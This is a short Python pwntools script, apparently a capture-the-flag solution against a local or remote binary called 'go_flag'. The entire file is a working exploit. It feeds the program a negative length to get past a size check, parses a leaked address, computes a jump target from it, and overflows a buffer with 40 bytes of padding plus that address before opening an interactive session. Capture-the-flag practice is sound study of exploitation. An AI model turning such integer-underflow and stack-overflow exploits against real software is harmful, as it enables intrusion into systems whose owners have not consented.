
# -- coding: utf-8 --
from pwn import *
context.log_level = 'debug'
# ENV
PORT =  1
HOST = ""

e = context.binary = ELF('./go_flag')
# lib = ELF('libc-2.31.so')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
    pause()

# VARIABLE
# PAYLOAD

ret=0x000000000000101a
r.sendlineafter(b"input len : ",b"-4294967400")
go = r.recv(12).ljust(8,b"\x00")
go=int(go, 16)
print(go)
flag = go-37
pause()
r.sendline(b"a"*40+flat(flag))
r.interactive()